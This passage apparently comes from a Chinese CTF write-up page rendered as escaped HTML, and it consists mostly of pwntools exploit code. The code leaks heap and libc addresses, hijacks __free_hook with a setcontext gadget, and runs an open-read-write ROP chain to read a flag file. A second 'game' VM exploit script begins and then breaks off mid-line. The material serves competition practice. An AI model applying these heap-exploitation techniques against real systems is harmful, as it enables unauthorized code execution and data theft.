&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HEAP:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x78&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x78&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x07&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;show&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x7F&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__malloc_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x70&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LIBC:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x03&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x40&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__free_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x4000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3000&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x10A0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x18&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;########################&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00000000000215BF&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;pop_rdx_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000000000001B96&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;pop_rax_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000000000043AE8&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;pop_rsi_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0000000000023EEA&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00000000000008AA&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Open&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;open&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;read&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;syscall&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;FLAG&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x4000&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;gadget&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;setcontext&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;53&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FLAG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rsi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rax_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;syscall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rsi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdx_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;#############################&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gadget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x38&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./flag&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x78&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x48&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;orw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:])&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x68&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heap_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pop_rdi_ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x58&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;free&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;game&#34;&gt;game&lt;/h3&gt;
&lt;p&gt;vmpwn 分析出指令格式即可&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#context.log_level = &amp;#39;DEBUG&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;RUN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;gt; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;RUN&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;OP:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;L:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;  &lt;span class=&#34;s1&#34;&gt;&amp;#39;W:&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span 